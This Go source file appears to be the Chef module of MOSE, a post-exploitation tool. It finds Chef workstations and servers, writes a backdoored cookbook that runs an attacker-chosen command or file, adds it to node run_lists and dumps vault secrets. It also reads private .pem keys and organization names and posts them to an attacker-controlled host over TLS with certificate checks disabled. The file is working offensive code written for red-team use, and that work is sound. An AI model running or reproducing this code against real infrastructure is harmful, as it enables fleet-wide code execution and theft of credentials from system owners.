// Copyright 2020 National Technology & Engineering Solutions of Sandia, LLC (NTESS).
// Under the terms of Contract DE-NA0003525 with NTESS,
// the U.S. Government retains certain rights in this software.

package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/json"
	"flag"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"text/template"
	"time"

	"github.com/master-of-servers/mose/pkg/chefutils"
	"github.com/master-of-servers/mose/pkg/moseutils"
	"github.com/master-of-servers/mose/pkg/system"

	"github.com/markbates/pkger"
	"github.com/rs/zerolog/log"
)

// Command holds information used to run commands on a target chef system
type Command struct {
	CmdName  string
	Cmd      string
	FileName string
	FilePath string
}

// Metadata holds the payload name to run on a target chef system
type Metadata struct {
	PayloadName string
}

var (
	a                = CreateAgent()
	cmd              = a.Cmd
	debug            = a.Debug
	localIP          = a.LocalIP
	osTarget         = a.OsTarget
	cookbookName     = a.PayloadName
	uploadFileName   = a.FileName
	serveSSL         = a.SSL
	exfilPort        = a.ExPort
	suppliedFilename string
	keys             []string
	inspect          bool
	suppliedNodes    string
	uploadFilePath   = a.RemoteUploadFilePath
	cleanup          bool
	cleanupFile      = a.CleanupFile
	noColor          bool
)

func init() {
	flag.BoolVar(&cleanup, "c", false, "Activate cleanup using the file location in settings.json")
	flag.StringVar(&suppliedFilename, "f", "", "Path to the file upload to be used with a chef cookbook")
	flag.BoolVar(&inspect, "i", false, "Used to retrieve information about a system.")
	flag.BoolVar(&noColor, "d", false, "Disable color output")
	flag.StringVar(&suppliedNodes, "n", "", "Space separated nodes")
}

// runKnifeCmd runs an input knife command
// It will return either an error or the output from running the specified command
func runKnifeCmd(cmd string, err error) ([]string, error) {
	if err != nil {
		return nil, err
	}
	cleansed := strings.Join(strings.Fields(cmd), " ")
	output := strings.Fields(cleansed)
	return output, err
}

// setRunLists adds the cookbook specified in cookbookName
// to the run_list for a specified set of nodes
func setRunLists(nodes []string, knifeFile string) {
	for _, node := range nodes {
		_, err := runKnifeCmd(system.RunCommand(knifeFile, "node", "run_list", "add", node, "recipe["+cookbookName+"]"))
		if err != nil {
			log.Error().Msgf("Unable to add the %v cookbook to the run_list for %s: %v", cookbookName, node, err)
		}
	}
}

// removeCookbookVersions removes the versions from cookbooks
// specified in the cookbooks input parameter and returns them
func removeCookbookVersions(cookbooks []string) []string {
	var output []string
	re := regexp.MustCompile(`^\d+\.\d+\.\d+$`)
	for _, cookbook := range cookbooks {
		matches := re.FindAllStringSubmatch(cookbook, -1)
		if len(matches) == 0 {
			output = append(output, cookbook)
		}
	}
	return output
}

// createMetadata is used to generate the metadata.rb file
// used in a chef workstation container using the metadata.rb template
func createMetadata(absCookbookPath string) bool {
	metadataCommand := Metadata{
		PayloadName: cookbookName,
	}

	templateContent, err := loadTemplateContent("/tmpl/metadata.rb.tmpl")
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	t, err := template.New("metadata").Parse(templateContent)

	if err != nil {
		log.Fatal().Err(err).Msg("Parse: ")
	}

	f, err := os.Create(filepath.Join(absCookbookPath, "metadata.rb"))

	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	if err = t.Execute(f, metadataCommand); err != nil {
		_ = f.Close()
		log.Fatal().Err(err).Msg("Execute: ")
	}
	if err := f.Close(); err != nil {
		log.Error().Err(err).Msg("Failed closing metadata.rb")
	}
	return true
}

// createCookbook will create a cookbook using a specified input command
func createCookbook(cookbooksLoc string, cookbookName string, cmd string) bool {
	chefCommand := Command{
		CmdName:  cookbookName,
		Cmd:      cmd,
		FileName: uploadFileName,
		FilePath: uploadFilePath,
	}

	templatePath := "/tmpl/chefCookbook.tmpl"
	if uploadFileName != "" {
		templatePath = "/tmpl/chefFileCookbook.tmpl"
	}
	templateContent, err := loadTemplateContent(templatePath)
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	t, err := template.New("chefCookbook").Parse(templateContent)

	if err != nil {
		log.Fatal().Err(err).Msg("Parse: ")
	}
	evilCookbook := []string{filepath.Join(cookbooksLoc, "/", cookbookName, "/recipes")}
	if system.CreateDirectories(evilCookbook) {
		moseutils.ColorMsgf("Successfully created the %s cookbook at %s", cookbookName, filepath.Join(cookbooksLoc, "/", cookbookName, "/recipes"))
	}

	absCookbookPath := filepath.Join(cookbooksLoc, "/", cookbookName)

	f, err := os.Create(filepath.Join(absCookbookPath, "/recipes", "default.rb"))

	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	_, err = moseutils.TrackChanges(cleanupFile, absCookbookPath)
	if err != nil {
		log.Error().Err(err).Msg("Error tracking changes: ")
	}

	if err = t.Execute(f, chefCommand); err != nil {
		_ = f.Close()
		log.Fatal().Err(err).Msg("Execute: ")
	}
	if err := f.Close(); err != nil {
		log.Error().Err(err).Msg("Failed closing default.rb")
	}

	// Logic for copying a file to the files directory
	filesLoc := filepath.Join(cookbooksLoc, cookbookName, "files")
	if uploadFileName != "" {
		if system.CreateDirectories([]string{filepath.Join(cookbooksLoc, cookbookName, "files/default")}) {
			moseutils.ColorMsgf("Successfully created files directory at location %s for file %s", filesLoc, uploadFileName)

			// Maybe assume it isn't in current directory?
			if err := system.CpFile(uploadFileName, filepath.Join(filesLoc, filepath.Base(uploadFileName))); err != nil {
				log.Fatal().Err(err).Msg("Failed copying upload file into cookbook")
			}

			_, err = moseutils.TrackChanges(cleanupFile, uploadFilePath)

			if err != nil {
				log.Error().Err(err).Msg("Error tracking changes: ")
			}

			if err := os.Chmod(filepath.Join(filesLoc, filepath.Base(uploadFileName)), 0644); err != nil {
				log.Fatal().Err(err).Msg("")
			}
			moseutils.ColorMsgf("Successfully copied and set permissions for %s", filepath.Join(filesLoc, filepath.Base(uploadFileName)))
		}
	}

	return createMetadata(absCookbookPath)
}

func loadTemplateContent(templatePath string) (string, error) {
	s, err := pkger.Open(templatePath)
	if err != nil {
		return "", err
	}
	dat := new(strings.Builder)
	if _, err := io.Copy(dat, s); err != nil {
		_ = s.Close()
		return "", err
	}
	if err := s.Close(); err != nil {
		return "", err
	}
	return dat.String(), nil
}

// locateConfig will identify knife.rb or config.rb files in an input list of files
func locateConfig(chefFiles []string) string {
	for _, file := range chefFiles {
		if strings.Contains(file, "knife.rb") || strings.Contains(file, "config.rb") {
			return file
		}
	}
	return ""
}

// Read config file line-by-line and get the location of any pem files that we need
func extractKeys(config string) []string {
	var chefKeys []string
	re := regexp.MustCompile(`.*key\s+'(.*?)'`)

	// Read file line-by-line
	file, err := os.Open(config)
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}

	// Find the path to the keys via regex
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		res := re.FindAllStringSubmatch(scanner.Text(), -1)
		if len(res) == 1 {
			chefKeys = append(chefKeys, res[0][1])
		}
	}

	if err := scanner.Err(); err != nil {
		_ = file.Close()
		log.Fatal().Err(err).Msg("")
	}

	if len(chefKeys) == 0 {
		_ = file.Close()
		log.Fatal().Msg("No keys found, exiting.")
	}
	if err := file.Close(); err != nil {
		log.Error().Err(err).Msg("Failed closing config file")
	}
	return chefKeys
}

// newFileUploadRequest creates a new file upload http request with optional extra params
func newFileUploadRequest(uri string, params map[string]string, paramName, path string) (*http.Request, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile(paramName, filepath.Base(path))
	if err != nil {
		return nil, err
	}
	if _, err = io.Copy(part, file); err != nil {
		return nil, err
	}

	for key, val := range params {
		if err := writer.WriteField(key, val); err != nil {
			return nil, err
		}
	}
	err = writer.Close()
	if err != nil {
		return nil, err
	}
	req, err := http.NewRequest("POST", uri, body)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())
	return req, nil
}

func transferJSON(jBytes []byte, endpoint string) {
	proto := "http://"
	if serveSSL {
		proto = "https://"
	}
	attacker := proto + localIP + ":" + strconv.Itoa(exfilPort) + "/" + endpoint
	log.Debug().Msgf("Attacker url: %s", attacker)

	req, err := http.NewRequest("POST", attacker, bytes.NewBuffer(jBytes))
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{}
	if serveSSL {
		tr := &http.Transport{
			MaxIdleConns: 10,
			TLSClientConfig: &tls.Config{
				MaxVersion:         tls.VersionTLS11,
				InsecureSkipVerify: true,
			},
		}
		client = &http.Client{Transport: tr}
	}
	for i := 0; i < 5; i++ {
		resp, err := client.Do(req)
		if err != nil {
			if i == 4 {
				log.Fatal().Err(err).Msg("Failure to send any responses, check host for issues")
			}
			log.Info().Msgf("Failure to send request. Retrying %d", i+1)
			time.Sleep(3 * time.Second)
			continue
		}
		resp.Body.Close()
		break
	}
}

func transferKey(key string) {
	proto := "http://"
	if serveSSL {
		proto = "https://"
	}
	attacker := proto + localIP + ":" + strconv.Itoa(exfilPort) + "/upload"
	request, err := newFileUploadRequest(attacker, nil, "file", key)
	if err != nil {
		log.Fatal().Err(err).Msg("")
	}
	client := &http.Client{}
	if serveSSL {
		tr := &http.Transport{
			MaxIdleConns: 10,
			TLSClientConfig: &tls.Config{
				MaxVersion:         tls.VersionTLS11,
				InsecureSkipVerify: true,
			},
		}
		client = &http.Client{Transport: tr}
	}
	resp, err := client.Do(request)
	if err != nil {
		log.Fatal().Err(err).Msg("")
	} else {
		body := &bytes.Buffer{}
		_, err := body.ReadFrom(resp.Body)
		if err != nil {
			log.Fatal().Err(err).Msg("")
		}
		resp.Body.Close()
		log.Info().Msgf("Exfilling %v, please wait...", key)
	}
}

func findSecrets(knifeFile string) {
	vaults, err := runKnifeCmd(system.RunCommand(knifeFile, "vault", "list"))
	if err != nil {
		log.Error().Err(err).Msg("Error while getting the vault list")
	}
	for _, vault := range vaults {
		secrets, err := runKnifeCmd(system.RunCommand(knifeFile, "vault", "show", vault))
		if err != nil {
			log.Error().Err(err).Msgf("Error retrieving secrets from %s", vault)
		}
		for _, secret := range secrets {
			output, err := runKnifeCmd(system.RunCommand(knifeFile, "vault", "show", vault, secret))
			if err != nil {
				log.Info().Msgf("Error retrieving %s from the %s vault: %v", secret, vault, err)
			}
			moseutils.ColorMsgf(strings.Join(output, " "))
		}
	}
}

func chefWorkstation(knifeFile string, chefDirs []string) {
	log.Info().Msg("Knife binary detected, attempting to get existing nodes and cookbooks...")
	nodes, err := runKnifeCmd(system.RunCommand(knifeFile, "node", "list"))
	if inspect {
		log.Info().Msgf("BEGIN NODE LIST %v END NODE LIST", nodes)
	}
	if err != nil {
		return
	}
	log.Info().Msg("We appear to be on a chef workstation")
	moseutils.ColorMsgf("The following nodes were identified: %v", nodes)
	cookbooks, err := runKnifeCmd(system.RunCommand(knifeFile, "cookbook", "list"))
	if err != nil {
		log.Fatal().Err(err).Msgf("Error while trying to get cookbooks: %s", err)
	}
	cookbooksNoVersions := removeCookbookVersions(cookbooks)
	moseutils.ColorMsgf("The following cookbooks were identified: %v", cookbooksNoVersions)
	if inspect {
		log.Log().Msg("Passive mode enabled, exiting.")
		os.Exit(0)
	}
	agents, err := getTargetAgents(nodes)
	if err != nil {
		log.Fatal().Err(err).Msg("Quitting")
	}
	nodes = announceCookbookTarget(agents, nodes)
	cookbooksLoc := findCookbooksDir(chefDirs)
	if cookbooksLoc == "" {
		log.Fatal().Msg("Unable to locate chef cookbooks directory")
	}
	createCookbook(cookbooksLoc, cookbookName, cmd)
	log.Log().Msg("Moving to the recipes dir in order to upload the cookbook.")
	system.Cd(cookbooksLoc)
	uploadCookbook(knifeFile)
	announceRunListTarget(agents, nodes)
	setRunLists(nodes, knifeFile)
	log.Info().Msgf("Attempting to find secrets, please wait...")
	findSecrets(knifeFile)
	log.Log().Msg("MOSE has finished, exiting.")
	os.Exit(0)
}

func getTargetAgents(nodes []string) ([]string, error) {
	if suppliedNodes != "" {
		return strings.Fields(suppliedNodes), nil
	}
	return chefutils.TargetAgents(nodes, osTarget)
}

func announceCookbookTarget(agents []string, nodes []string) []string {
	if len(agents) == 0 {
		log.Fatal().Msg("No chef agents selected, exiting.")
	}
	if agents[0] != "MOSEALL" {
		nodes = agents
		if uploadFileName != "" {
			log.Info().Msgf("Creating a cookbook to run this file: %s on the following Chef agents: %v, please wait...", uploadFileName, nodes)
		} else {
			log.Info().Msgf("Creating a cookbook to run this command: %s on the following Chef agents: %v, please wait...", cmd, nodes)
		}
		return nodes
	}
	if uploadFileName != "" {
		log.Info().Msgf("Creating a cookbook to run this file: %s on all Chef agents, please wait...", uploadFileName)
	} else {
		log.Info().Msgf("Creating a cookbook to run this command: %s on all Chef agents, please wait...", cmd)
	}
	return nodes
}

func announceRunListTarget(agents []string, nodes []string) {
	if len(agents) == 0 {
		log.Fatal().Msg("No chef agents selected, exiting.")
	}
	if agents[0] != "MOSEALL" {
		if uploadFileName != "" {
			log.Info().Msgf("Adding a cookbook to run this file: %s to the run_list for the following Chef agents: %v, please wait...", uploadFileName, nodes)
		} else {
			log.Info().Msgf("Adding a cookbook that will run this command: %s to the run_list for the following Chef agents: %v, please wait...", cmd, nodes)
		}
		return
	}
	if uploadFileName != "" {
		log.Info().Msgf("Adding a cookbook to run this file: %s to the run_list for all Chef agents, please wait...", uploadFileName)
	} else {
		log.Info().Msgf("Adding a cookbook that run will run this command: %s to the run_list for all Chef agents, please wait...", cmd)
	}
}

func findCookbooksDir(chefDirs []string) string {
	for _, dir := range chefDirs {
		if strings.Contains(dir, ".chef/cookbooks") {
			return dir
		}
	}
	return ""
}

func uploadCookbook(knifeFile string) {
	log.Info().Msg("Uploading the cookbook we've created to the chef server, please wait...")
	if _, err := runKnifeCmd(system.RunCommand(knifeFile, "upload", cookbookName)); err != nil {
		log.Fatal().Err(err).Msgf("Error while trying to upload backdoored cookbook: %s using the following command: %v", err, knifeFile+" upload "+cookbookName)
	}
}

func chefServer(chefServerFile string, chefFiles []string) {
	log.Log().Msg("Chef Server detected")
	log.Info().Msgf("Using %v to find organizations, please wait...", chefServerFile)
	organizations, err := system.RunCommand(chefServerFile, "org-list")
	if err != nil {
		log.Fatal().Err(err).Msg("ERROR: Unable to get organizations")
	}
	type Org struct {
		Name string
	}
	jBytes, _ := json.Marshal(Org{Name: organizations})
	log.Info().Msgf("Exfilling organization name %v...", organizations)
	transferJSON(jBytes, "org")
	config := locateConfig(chefFiles)
	// If a config.rb or knife.rb exists, use it to locate the keys
	if config != "" {
		moseutils.ColorMsgf("Located config files at %v", config)
		keys = extractKeys(config)
		for _, key := range keys {
			transferKey(key)
		}
	} else {
		for _, file := range chefFiles {
			if strings.HasSuffix(file, ".pem") {
				transferKey(file)
			}
		}
		log.Log().Msg("Finished exfiltrating keys, move to the docker container being spawned on the attacker's system to continue post exploitation operations.")
		os.Exit(0)
	}
}

// cleanupChef removes any cookbooks introduced by MOSE, as well as
// any instances of this cookbook in the run_lists for the agents
func cleanupChef(knifeFile string) {
	_, err := moseutils.TrackChanges(cleanupFile, cleanupFile)

	if err != nil {
		log.Error().Err(err).Msg("Error tracking changes: ")
	}

	nodes, _ := runKnifeCmd(system.RunCommand(knifeFile, "node", "list"))
	for _, node := range nodes {
		log.Info().Msgf("Removing %s from the run_list on %s", cookbookName, node)
		_, err := runKnifeCmd(system.RunCommand(knifeFile, "node", "run_list", "remove", node, "recipe["+cookbookName+"]"))
		if err != nil {
			log.Error().Err(err).Msgf("Error deleting the %s cookbook from %s", cookbookName, node)
		}
	}
	_, err = runKnifeCmd(system.RunCommand(knifeFile, "cookbook", "delete", "-y", cookbookName))
	if err != nil {
		moseutils.ColorMsgf("Error deleting the %s cookbook from the chef server", cookbookName)
	}

	answer, err := moseutils.AskUserQuestion("Would you like to remove all files created by running MOSE previously? ", osTarget)
	if err != nil {
		log.Fatal().Err(err).Msg("Quitting...")
	}
	moseutils.RemoveTracker(cleanupFile, osTarget, answer)
	os.Exit(0)
}

func main() {
	moseutils.NOCOLOR = noColor
	moseutils.SetupLogger(debug)
	flag.Parse()
	// If we're not root, we probably can't backdoor any of the chef code, so exit
	system.CheckRoot()

	chefFiles, chefDirs := system.FindFiles([]string{"/etc/chef", "/home", "/root"}, []string{".pem"}, []string{"config.rb", "knife.rb"}, []string{`\/cookbooks$`})

	if len(chefFiles) == 0 {
		log.Fatal().Msg("Unable to find any chef files, exiting.")
	}
	if len(chefDirs) == 0 {
		log.Error().Msg("Unable to find the cookbooks directory.")
	}
	if suppliedFilename != "" && uploadFileName != "" {
		moseutils.ColorMsgf("The suppliedFilename (%s) flag is set, assigning to uploadFilename (%s).", suppliedFilename, uploadFileName)
		uploadFileName = suppliedFilename
	}
	// check if knife binary exists on server
	found, knifeFile := system.FindFile("knife", []string{"/bin", "/home", "/opt", "/root"})
	if cleanup {
		log.Debug().Msg("Cleanup")
		cleanupChef(knifeFile)
		os.Exit(0)
	}

	if found {
		chefWorkstation(knifeFile, chefDirs)
	}

	log.Info().Msg("Determining if we are on a chef server or an invalid target, please wait...")
	found, chefServerFile := system.FindFile("chef-server-ctl", []string{"/bin", "/home", "/opt", "/root"})
	if found {
		chefServer(chefServerFile, chefFiles)
	}
	log.Error().Msg("We are on an invalid target, exiting...")
	os.Exit(1)
}
